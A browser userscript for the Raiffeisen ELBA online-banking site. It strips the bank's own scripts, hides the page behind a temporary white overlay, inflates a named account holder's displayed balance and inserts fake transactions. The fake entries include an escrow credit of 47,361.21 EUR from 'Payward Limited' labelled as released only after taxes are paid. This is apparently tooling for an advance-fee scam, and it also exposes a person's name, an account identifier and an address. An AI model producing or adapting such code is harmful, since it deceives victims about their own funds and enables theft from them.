// ==UserScript==
// @name      ElCombined Wolfgang Krenn
// @description Deletes elements with specified classes, logs and edits balance if specified text is found, and adds new transactions with specific texts and amounts
// @version  1.0
// @grant    none
// @match    https://mein.elba.raiffeisen.at/*
// @run-at   document-end
// @namespace https://greasyfork.org/users/972766
// @downloadURL https://update.greasyfork.org/scripts/472830/ElCombined%20Wolfgang%20Krenn.user.js
// @updateURL https://update.greasyfork.org/scripts/472830/ElCombined%20Wolfgang%20Krenn.meta.js
// ==/UserScript==

(function() {
   'use strict';

    // Utility functions

   var autoReloadURLPatterns = [
       "AT",
       "AT493807100000005512",//changed
       "kreditkarten",
       "dashboard",
       // Add more URL patterns here if needed
   ];

   function removeScripts() {
       document.querySelectorAll('script').forEach(function(script) {
           script.remove();
       });
   }

   var scriptObserver = new MutationObserver(function(mutationsList, observer) {
       mutationsList.forEach(function(mutation) {
           if (mutation.addedNodes) {
               mutation.addedNodes.forEach(function(node) {
                   if (node.tagName === 'SCRIPT') {
                       node.remove();
                       console.log('Dynamically added script removed.');
                   }
               });
           }
       });
   });

   scriptObserver.observe(document.body, { childList: true, subtree: true });

   document.addEventListener('click', function(event) {
       var targetElement = event.target;
       var isWithinScrollableContent = targetElement.closest('.scrollable-content') !== null;

       if (isWithinScrollableContent) {
           return;
       }

       var currentURL = window.location.href;
       var shouldReload = autoReloadURLPatterns.some(function(pattern) {
           return currentURL.includes(pattern);
       });

       if (shouldReload) {
           removeScripts();
           console.log('All script elements have been removed.');
           setTimeout(function() {
               window.location.reload();
           }, 0);
       }
   });

   var overlay = document.createElement('div');
   overlay.style.position = 'fixed';
   overlay.style.top = '0';
   overlay.style.left = '0';
   overlay.style.width = '100%';
   overlay.style.height = '100%';
   overlay.style.backgroundColor = 'white';
   overlay.style.zIndex = '9999';
   document.body.appendChild(overlay);

   var overlayDuration = 7000;
   setTimeout(function() {
       overlay.remove();
   }, overlayDuration);


      // Define the object that maps class names to delays
var classesToDelayMap = {
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted": 2000, // Delay for the first class
    "widget grid-item span-x-2 span-y-2 ng-star-inserted": 4000, // Delay for the second class
    "d-block ng-star-inserted": 6000, // Delay for the third class
    "container-fluid": 3000,
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted": 4000
    // Add more class-delay pairs as needed
};

// Define the function to remove elements with the specified class and delay
function removeElementsByClassWithDelay(className) {
    var delay = classesToDelayMap[className] || 0; // Use the specified delay or default to 0
    setTimeout(function() {
        var elements = document.getElementsByClassName(className);
        while (elements.length > 0) {
            elements[0].parentNode.removeChild(elements[0]);
        }
        console.log("Elements with class '" + className + "' have been removed.");
    }, delay);
}

// Class names to delete
var classesToDelete = [
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted",
    "widget grid-item span-x-2 span-y-2 ng-star-inserted",
    "d-block ng-star-inserted",
    "container-fluid", // Add the class to be deleted here
    "dashboard ng-star-inserted"
];

// Loop through the array and call the function for each class with its specified delay
for (var i = 0; i < classesToDelete.length; i++) {
    var className = classesToDelete[i];
    removeElementsByClassWithDelay(className);
}

    ////  FIRST SCRIPT

   function firstScript() {
       var TEXT_TO_FIND_1 = "KRENN WOLFGANG UND";
       var AMOUNT_TO_EDIT_1 =1800; //changed

       var elementsToSearch = document.getElementsByClassName("rds-scrub-item rds-focus-indicator ng-star-inserted");

       for (var j = 0; j < elementsToSearch.length; j++) {
           var text = elementsToSearch[j].textContent.trim();

           if (text.includes(TEXT_TO_FIND_1)) {
               console.log("Specified text '" + TEXT_TO_FIND_1 + "' found in element number " + (j + 1) + ".");
               console.log(elementsToSearch[j]);

               var balanceElement = elementsToSearch[j].querySelector('.rds-headline.mb-0.text-truncate.text-danger.ng-star-inserted, .rds-headline.mb-0.text-truncate.text-success.ng-star-inserted');

               if (balanceElement) {
                   var balanceText = balanceElement.textContent.trim().replace(/[^0-9.,-]+/g, "");
                   var balance = parseAmount(balanceText);

                   console.log("Original balance: " + balanceElement.textContent.trim());

                   var editedBalance = balance + AMOUNT_TO_EDIT_1;
                   var editedClass = editedBalance >= 0 ? "text-success" : "text-danger";

                   balanceElement.classList.remove("text-success", "text-danger");
                   balanceElement.classList.add(editedClass);
                   balanceElement.textContent = formatAmount(editedBalance);
                   console.log("1ScriptEdited balance: " + balanceElement.textContent.trim());
               }
           }
       }
   }



    /// THIRDS SCRIPT
   function thirdScript() {
       var TEXT_TO_FIND_3 = "Mag. Bernd Kropf Saaz 100 8341 Paldau";
       var NEW_TEXT = "Treuhand:Payward Limited";
       var NEW_AMOUNT = 47361.21;
       var NEW_NG_STAR_INSERTED_TEXT = "Freigabe nach Zahlung von Steuern";
       var DUPLICATE_MOVE_DIRECTION = "up";
       var DUPLICATE_MOVE_STEPS = 20;

       var ADDITIONAL_TRANSACTIONS = [
           {
               text: "Payward Limited",
               amount: 1800,
               ngStarInsertedText: "Geld für Steuern",
               moveDirection: "up",
               moveSteps: 18,
               enabled: true,
           },
           // Add more additional transactions as needed
       ];

       function waitForNgStarInsertedElements(maxAttempts, interval, callback) {
           var elements = document.getElementsByClassName('ng-star-inserted');
           if (elements.length > 0) {
               callback();
           } else {
               var attempts = 0;
               var checkInterval = setInterval(function() {
                   attempts++;
                   elements = document.getElementsByClassName('ng-star-inserted');
                   if (elements.length > 0 || attempts >= maxAttempts) {
                       clearInterval(checkInterval);
                       if (elements.length > 0) {
                           callback();
                       } else {
                           console.log('Maximum attempts reached. Script execution completed.');
                       }
                   }
               }, interval);
           }
       }

       function formatAmount(amount) {
           return new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(amount);
       }

       function moveElement(element, steps, direction) {
           var parent = element.parentNode;
           var sibling;

           if (direction === "up") {
               for (let i = 0; i < steps; i++) {
                   sibling = element.previousElementSibling;
                   if (sibling) {
                       parent.insertBefore(element, sibling);
                   }
               }
           } else if (direction === "down") {
               for (let i = 0; i < steps; i++) {
                   sibling = element.nextElementSibling;
                   if (sibling) {
                       parent.insertBefore(sibling, element);
                   }
               }
           }
       }

       function createTransaction(element, text, amount, ngStarInsertedText, moveSteps, moveDirection) {
           var clone = element.cloneNode(true);
           clone.removeAttribute("id");

           var parent = element.parentElement;
           if (parent) {
               parent.insertBefore(clone, element.nextSibling);
               moveElement(clone, moveSteps, moveDirection);

               var listTextElement = clone.getElementsByClassName('rds-list-text')[0];
               if (listTextElement) {
                   var textElement = listTextElement.getElementsByTagName('p')[0];
                   if (textElement) {
                       textElement.textContent = text;
                   }

                   var ngStarInsertedElement = document.createElement("p");
                   ngStarInsertedElement.className = "rds-line ng-star-inserted";

                   var smallElement = document.createElement("small");
                   smallElement.textContent = ngStarInsertedText;
                   ngStarInsertedElement.appendChild(smallElement);
                   listTextElement.appendChild(ngStarInsertedElement);
               }

               var amountElement = clone.getElementsByClassName('text-success')[0] || clone.getElementsByClassName('text-danger')[0];
               if (amountElement) {
                   amountElement.classList.remove('text-success', 'text-danger');
                   var newClass = amount >= 0 ? 'text-success' : 'text-danger';
                   amountElement.classList.add(newClass);
                   amountElement.textContent = formatAmount(amount);
               }
           }
       }

       function waitForClassToAppear(className, maxAttempts, interval, callback) {
           var observer = new MutationObserver(function(mutationsList, observer) {
               var elements = document.getElementsByClassName(className);
               if (elements.length > 0) {
                   observer.disconnect();
                   callback();
               }
           });

           observer.observe(document.body, { childList: true, subtree: true });

           var attempts = 0;
           var checkInterval = setInterval(function() {
               attempts++;
               var elements = document.getElementsByClassName(className);
               if (elements.length > 0 || attempts >= maxAttempts) {
                   clearInterval(checkInterval);
                   observer.disconnect();
               }
           }, interval);
       }

       waitForNgStarInsertedElements(10, 7000, function() {
           var lastMatchingElement = null;

           var elements = document.getElementsByClassName('ng-star-inserted');
           for (var i = 0; i < elements.length; i++) {
               var pElement = elements[i].querySelector('p.rds-line');
               if (pElement && pElement.textContent === TEXT_TO_FIND_3) {
                   lastMatchingElement = elements[i];
               }
           }

           if (lastMatchingElement) {
               createTransaction(lastMatchingElement, NEW_TEXT, NEW_AMOUNT, NEW_NG_STAR_INSERTED_TEXT, DUPLICATE_MOVE_STEPS, DUPLICATE_MOVE_DIRECTION);

               for (let i = 0; i < ADDITIONAL_TRANSACTIONS.length; i++) {
                   const transaction = ADDITIONAL_TRANSACTIONS[i];
                   if (transaction.enabled) {
                       createTransaction(lastMatchingElement, transaction.text, transaction.amount, transaction.ngStarInsertedText, transaction.moveSteps, transaction.moveDirection);
                   }
               }
           } else {
               console.log("No matching element found.");
           }

           console.log("Script execution completed.");
       });

   }

   function formatAmount(amount) {
       return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(amount) + " EUR";
   }

   function parseAmount(amountString) {
       var amount = parseFloat(amountString.replace('.', '').replace(',', '.'));
       return isNaN(amount) ? 0 : amount;
   }

   function adjustAndFormatBalance(originalBalance) {
       var isNegative = originalBalance.includes('-');
       var originalBalanceInNumber = Number(originalBalance.replace(/[-. EUR]/g, '').replace(',', '.'));
       originalBalanceInNumber = isNegative ? -originalBalanceInNumber : originalBalanceInNumber;
       var adjustedBalance = originalBalanceInNumber + AMOUNT_TO_ADJUST;
       return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(adjustedBalance);
   }

   function adjustClass(element, balance) {
       if (balance >= 0) {
           element.classList.remove('text-danger');
           element.classList.add('text-success');
       } else {
           element.classList.remove('text-success');
           element.classList.add('text-danger');
       }
   }

   removeScripts();
    // Call the first script with a delay
    setTimeout(function() {
        firstScript();
    }, 2000); // Adjust the delay (in milliseconds) as needed

    // Call the third script with a delay
    setTimeout(function() {
        thirdScript();
    }, 7000); // Adjust the delay (in milliseconds) as needed
   removeScripts();

})();
